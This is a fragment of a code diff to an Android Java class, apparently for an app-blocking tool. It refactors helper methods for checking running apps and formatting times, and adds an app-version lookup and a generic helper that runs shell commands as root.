     private boolean isAppRunning(String packageName) {
-        List<ActivityManager.RunningAppProcessInfo> runningProcesses = 
+        List<ActivityManager.RunningAppProcessInfo> procs =
             activityManager.getRunningAppProcesses();
-        if (runningProcesses != null) {
-            for (ActivityManager.RunningAppProcessInfo process : runningProcesses) {
-                for (String pkg : process.pkgList) {
-                    if (pkg.equals(packageName)) {
-                        return true;
-                    }
-                }
-            }
-        }
+        if (procs == null) return false;
+        for (ActivityManager.RunningAppProcessInfo proc : procs)
+            for (String pkg : proc.pkgList)
+                if (pkg.equals(packageName)) return true;
         return false;
     }
-    
-    private String formatTime(long millis) {
-        long hours = TimeUnit.MILLISECONDS.toHours(millis);
-        long minutes = TimeUnit.MILLISECONDS.toMinutes(millis) % 60;
-        long seconds = TimeUnit.MILLISECONDS.toSeconds(millis) % 60;
-        
-        if (hours > 0) {
-            return String.format("%dh %dm", hours, minutes);
-        } else if (minutes > 0) {
-            return String.format("%dm %ds", minutes, seconds);
-        } else {
-            return String.format("%ds", seconds);
+
+    private String getAppVersion(String packageName) {
+        try { return packageManager.getPackageInfo(packageName, 0).versionName; }
+        catch (Exception e) { return "Unknown"; }
+    }
+
+    /** Run a shell command via su. Returns true if exit code == 0. */
+    private boolean tryRoot(String cmd) {
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
+            return p.waitFor() == 0;
+        } catch (Exception e) {
+            Log.w(TAG, "tryRoot failed: " + cmd + " — " + e.getMessage());
+            return false;
         }
     }
-    
-    private String formatTimestamp(long timestamp) {
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
-        return sdf.format(new Date(timestamp));
+
+    private String formatTime(long millis) {
+        long h = TimeUnit.MILLISECONDS.toHours(millis);
+        long m = TimeUnit.MILLISECONDS.toMinutes(millis) % 60;
+        long s = TimeUnit.MILLISECONDS.toSeconds(millis) % 60;
+        if (h > 0) return h + "h " + m + "m";
+        if (m > 0) return m + "m " + s + "s";
+        return s + "s";
     }
-    
-    private void saveBlockedPackages() {
-        // In production, save to SharedPreferences
-        Log.d(TAG, "Blocked packages: " + blockedPackages);
+
+    private String formatTimestamp(long ts) {
+        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date(ts));
     }
 }
